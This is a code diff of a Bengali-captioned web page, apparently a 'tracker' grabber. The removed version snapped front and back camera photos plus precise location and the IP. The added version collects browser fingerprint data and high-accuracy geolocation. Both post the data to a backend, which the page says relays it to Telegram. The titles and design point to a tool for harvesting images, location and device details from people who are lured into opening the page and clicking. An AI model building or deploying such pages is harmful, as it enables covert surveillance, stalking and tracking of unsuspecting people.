@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Premium Dual Capture</title>
+  <title>Browser Info Sender</title>
   <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&family=Roboto:wght@400;700&display=swap" rel="stylesheet">
   <style>
     :root {
@@ -105,44 +105,48 @@
 </head>
 <body>
 
-  <h1>Dual Camera + Real Location</h1>
-  <p class="subtitle">এক ক্লিকে ফ্রন্ট + ব্যাক ছবি + সঠিক লোকেশন + IP Telegram-এ পাঠানো হবে</p>
+  <h1>Browser + Location Tracker</h1>
+  <p class="subtitle">এক ক্লিকে ব্রাউজারের সব ইনফো + রিয়েল লোকেশন Telegram-এ পাঠানো হবে</p>
 
   <div class="premium-card">
-    <button id="captureBtn" onclick="captureAll()">
-      Capture & Send Everything
+    <button id="sendBtn" onclick="sendBrowserInfo()">
+      Send My Browser & Location
     </button>
 
     <div id="status"></div>
   </div>
 
   <script>
-    const btn = document.getElementById('captureBtn');
+    const btn = document.getElementById('sendBtn');
     const status = document.getElementById('status');
 
-    async function captureAll() {
+    async function sendBrowserInfo() {
       btn.disabled = true;
-      btn.textContent = "Processing...";
-      status.textContent = "Starting...";
+      btn.textContent = "Collecting & Sending...";
+      status.textContent = "Collecting browser info...";
 
       try {
-        // ১. Front camera photo
-        status.textContent = "Front camera...";
-        const frontStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user" }
-        });
-        const frontBase64 = await quickCapture(frontStream);
-        await sendData({ type: "front", image: frontBase64 });
+        // Browser info
+        const browserInfo = {
+          userAgent: navigator.userAgent,
+          platform: navigator.platform,
+          language: navigator.language,
+          languages: navigator.languages.join(', '),
+          hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
+          deviceMemory: navigator.deviceMemory || 'Unknown',
+          screen: `${screen.width}x${screen.height} (color depth: ${screen.colorDepth})`,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          cookiesEnabled: navigator.cookieEnabled,
+          doNotTrack: navigator.doNotTrack || 'Unknown',
+          connection: navigator.connection ? {
+            type: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            rtt: navigator.connection.rtt
+          } : 'Unknown',
+          timestamp: new Date().toISOString()
+        };
 
-        // ২. Back camera photo
-        status.textContent = "Back camera...";
-        const backStream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "environment" }
-        });
-        const backBase64 = await quickCapture(backStream);
-        await sendData({ type: "back", image: backBase64 });
-
-        // ৩. Geolocation (real location)
+        // Geolocation
         status.textContent = "Getting real location... (allow permission)";
         let geo = "Location permission denied or error";
         let mapLink = "";
@@ -150,7 +154,7 @@
           const position = await new Promise((resolve, reject) => {
             navigator.geolocation.getCurrentPosition(resolve, reject, {
               enableHighAccuracy: true,
-              timeout: 20000,        // ২০ সেকেন্ড পর্যন্ত অপেক্ষা
+              timeout: 20000,
               maximumAge: 0
             });
           });
@@ -160,57 +164,42 @@
           const acc = position.coords.accuracy.toFixed(0);
           geo = `${lat}, ${lon} (accuracy: ${acc}m)`;
           mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
-          status.textContent = "Real location captured → Sending...";
+          status.textContent = "Location captured → Sending...";
         } catch (geoErr) {
           console.error("Geolocation error:", geoErr);
-          geo = geoErr.message || "Location error";
-          if (geoErr.code === 1) geo = "Location permission denied – please allow";
-          if (geoErr.code === 3) geo = "Location timeout – try again";
+          if (geoErr.code === 1) geo = "Permission denied – allow in browser settings";
+          else if (geoErr.code === 2) geo = "Position unavailable – check GPS";
+          else if (geoErr.code === 3) geo = "Timeout – try again";
+          else geo = "Error: " + geoErr.message;
+          status.textContent = geo;
         }
 
         // সব ডাটা একসাথে পাঠানো
-        await sendData({
-          type: "info",
+        const payload = {
+          browser: browserInfo,
           geo: geo,
           mapLink: mapLink,
           timestamp: new Date().toISOString()
+        };
+
+        const res = await fetch("/api/send-info", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
         });
 
-        status.textContent = "All sent successfully ✓ (photos + real location + IP)";
+        if (res.ok) {
+          status.textContent = "All browser info + location sent successfully ✓";
+        } else {
+          const errText = await res.text();
+          status.textContent = "Send failed: " + errText;
+        }
       } catch (err) {
         status.textContent = "Error: " + (err.message || "Unknown error");
         console.error(err);
       } finally {
         btn.disabled = false;
-        btn.textContent = "Capture & Send Everything";
-      }
-    }
-
-    async function quickCapture(stream) {
-      const video = document.createElement('video');
-      video.srcObject = stream;
-      await new Promise(r => video.onloadedmetadata = r);
-      await video.play();
-
-      const canvas = document.createElement('canvas');
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext('2d').drawImage(video, 0, 0);
-
-      stream.getTracks().forEach(t => t.stop());
-      return canvas.toDataURL('image/png');
-    }
-
-    async function sendData(payload) {
-      const res = await fetch("/api/send-all", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify(payload)
-      });
-
-      if (!res.ok) {
-        const errText = await res.text();
-        throw new Error(errText || "Send failed");
+        btn.textContent = "Send My Browser & Location";
       }
     }
   </script>
